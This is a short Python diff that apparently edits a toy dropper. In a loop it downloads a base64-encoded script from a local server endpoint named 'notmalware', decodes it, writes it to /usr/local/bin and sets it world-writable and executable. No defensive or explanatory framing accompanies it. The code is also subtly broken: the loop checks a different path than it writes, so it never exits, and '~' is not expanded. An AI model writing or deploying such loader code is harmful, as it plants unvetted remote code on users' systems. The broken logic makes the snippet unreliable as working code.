@@ -21,12 +21,12 @@ import subprocess
 import os.path
 import time
 
-while not os.path.exists("~/.legitscript.sh"):
+while not os.path.exists("~/.notmalware.sh"):
     r = requests.get("http://127.0.0.1:5000/notmalware")
     script = base64.b64decode(r.text)
-    with open("~/.legitscript.sh","wb") as f:
+    with open("/usr/local/bin/notmalware.sh","wb") as f:
         f.write(script)
-        subprocess.run(["chmod", "777", "~/.legitscript.sh"])
+        subprocess.run(["chmod", "777", "/usr/local/bin/notmalware.sh"])
         f.close()
     time.sleep(5)
     
